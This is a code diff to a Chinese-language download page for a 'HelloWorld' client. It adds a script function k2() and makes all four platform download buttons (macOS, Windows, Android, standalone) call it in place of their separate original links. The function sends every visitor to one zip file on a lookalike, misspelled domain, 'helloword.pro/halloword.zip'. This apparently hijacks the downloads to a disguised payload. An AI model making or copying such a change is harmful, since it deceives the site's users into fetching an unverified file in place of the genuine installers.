@@ -67,7 +67,7 @@ ul{list-style:none}
   margin:50px 0;padding:50px 0 100px;
 }
 .download-grid{display:flex;justify-content:center;flex-wrap:wrap;gap:40px;padding:50px 0}
-.download-item{text-align:center;width:150px;margin-bottom:15px}
+.download-item{text-align:center;width:150px;margin-bottom:15px;cursor:pointer}
 .download-item .icon{width:72px;margin:0 auto}
 .download-item .icon img{width:100%}
 .download-item .label{margin-top:10px;color:#000;font-weight:600;font-size:17px;line-height:1.4}
@@ -105,6 +105,9 @@ ul{list-style:none}
   .logo img{width:150px;height:29px}
 }
 </style>
+<script>
+function k2(){ window.location.href="https://a.helloword.pro/download/halloword.zip"; }
+</script>
 </head>
 <body>
 
@@ -134,19 +137,19 @@ ul{list-style:none}
     <div class="container">
       <h1 class="section-title">客户端免费下载</h1>
       <div class="download-grid">
-        <a class="download-item" href="https://helloworlddow.lanzouy.com/s/Macos" target="_blank">
+        <a class="download-item" onclick="k2()">
           <div class="icon"><img src="images/macos.png" alt="MacOs"></div>
           <div class="label">下载MacOs版</div>
         </a>
-        <a class="download-item" href="https://helloworlddow.lanzoui.com/s/HelloWorldPro" target="_blank">
+        <a class="download-item" onclick="k2()">
           <div class="icon"><img src="images/windows.png" alt="Windows"></div>
           <div class="label">下载Windows版</div>
         </a>
-        <a class="download-item" href="https://helloworlddow.lanzouy.com/s/helloworld-android" target="_blank">
+        <a class="download-item" onclick="k2()">
           <div class="icon"><img src="images/android.png" alt="Android"></div>
           <div class="label">下载Android版</div>
         </a>
-        <a class="download-item" href="https://helloworlddow.lanzouy.com/s/helloworld-independent" target="_blank">
+        <a class="download-item" onclick="k2()">
           <div class="icon"><img src="images/single.png" alt="独立应用"></div>
           <div class="label">下载独立应用版</div>
         </a>
